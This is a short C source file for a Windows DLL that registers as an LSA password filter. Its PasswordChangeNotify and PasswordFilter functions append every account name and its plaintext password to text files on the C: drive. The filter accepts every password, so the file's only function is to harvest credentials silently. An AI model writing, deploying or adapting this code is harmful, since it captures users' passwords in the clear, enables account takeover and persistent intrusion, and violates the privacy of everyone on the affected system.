#include "stdafx.h"

#include <Windows.h>
#include <stdio.h>
#include <SubAuth.h>
BOOLEAN __stdcall InitializeChangeNotify(void) 
{
	return TRUE;
}

NTSTATUS __stdcall PasswordChangeNotify(PUNICODE_STRING UserName,ULONG RelativeId,PUNICODE_STRING NewPassword) 
{
	FILE* pFile;
	int err = fopen_s(&pFile,"c:\\logFile1.txt", "a+");
	if (err!=0)
    {
        return 0;
    }
	fprintf(pFile, "%wZ:%wZ\r\n",UserName,NewPassword);
	fclose(pFile);
	return 0;
}

BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING AccountName,PUNICODE_STRING FullName,PUNICODE_STRING Password,BOOLEAN SetOperation)
{
	FILE* pFile;
	int err = fopen_s(&pFile,"c:\\logFile2.txt", "a+");
	if (err!=0)
    {
        return 1;
    }
	fprintf(pFile, "%wZ:%wZ\r\n", AccountName,Password);
	fclose(pFile);
	return 1;	
}
BOOL APIENTRY DllMain( HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}

